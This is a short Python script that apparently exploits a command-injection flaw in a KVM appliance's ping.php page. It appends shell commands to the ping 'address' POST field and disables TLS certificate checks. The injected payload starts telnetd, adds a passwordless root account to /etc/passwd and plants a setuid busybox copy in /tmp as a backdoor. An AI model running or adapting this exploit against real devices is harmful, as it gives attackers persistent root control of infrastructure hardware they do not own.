from StringIO import StringIO
import pycurl
import re
sessid = "XXXXXXXXX"
target = "https://ip.of.kvm/ping.php" <https://172.30.30.40/ping.php>

command = "/sbin/telnetd ; echo superb::0:0:owned:/:/bin/sh >> /etc/passwd
; cp /bin/busybox /tmp/su ; chmod 6755 /tmp/su ; echo done. now connect to
device using telnet with user target and pass target, then \"/tmp/su -
superb\""

storage = StringIO()
c = pycurl.Curl()
c.setopt(c.URL, target)
c.setopt(c.SSL_VERIFYPEER,0)
c.setopt(c.SSL_VERIFYHOST,0)
c.setopt(c.WRITEFUNCTION,storage.write)
c.setopt(c.POSTFIELDS, 'address=255.255.255.255&action=ping&size=56&count=1
; echo *E* ; ' + command + ' ; echo *E*')
c.setopt(c.COOKIE,'avctSessionId=' + sessid)

try:
     c.perform()
     c.close()
except:
     print ""

content = storage.getvalue()
x1 = re.search(r"\*E\*(.*)\*E\*",content)
print x1.group(1).replace("<br />","\n")
